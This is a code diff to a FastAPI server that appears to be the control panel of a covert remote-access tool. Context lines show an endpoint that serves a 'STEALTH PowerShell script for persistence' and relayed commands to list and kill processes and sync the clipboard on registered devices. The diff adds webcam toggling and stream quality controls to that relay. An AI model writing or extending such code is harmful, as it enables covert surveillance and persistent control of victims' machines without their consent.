@@ -12,8 +12,9 @@ from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Response, Request
 from fastapi.staticfiles import StaticFiles
 import uvicorn
 
-VERSION = "6.2.0-STABLE" # Trigger Clean Build
+VERSION = "6.6.0-PRO" # Core UI Overhaul
 app = FastAPI()
+from fastapi.responses import HTMLResponse
 
 
 RECORDINGS_DIR = "recordings"
@@ -128,6 +129,11 @@ async def list_recordings():
 async def list_devices():
     return list(DEVICE_REGISTRY.values())
 
+@app.get("/", response_class=HTMLResponse)
+async def get_index():
+    with open("index.html", "r", encoding="utf-8") as f:
+        return f.read()
+
 @app.get("/api/script")
 async def get_deploy_script(request: Request):
     # Returns a STEALTH PowerShell script for persistence
@@ -238,7 +244,7 @@ async def websocket_endpoint(websocket: WebSocket):
                     PORTAL_TO_CLIENT[websocket] = None
                 elif event["t"] == "select_device":
                     PORTAL_TO_CLIENT[websocket] = str(event["id"])
-                elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "clipboard_sync", "select_monitor"):
+                elif event["t"] in ("rtc_offer", "rtc_ice", "get_processes", "kill_process", "clipboard_sync", "select_monitor", "toggle_webcam", "set_quality", "set_fps"):
                     target_client = PORTAL_TO_CLIENT.get(websocket)
                     if target_client:
                         await manager.send_to_client(target_client, event)
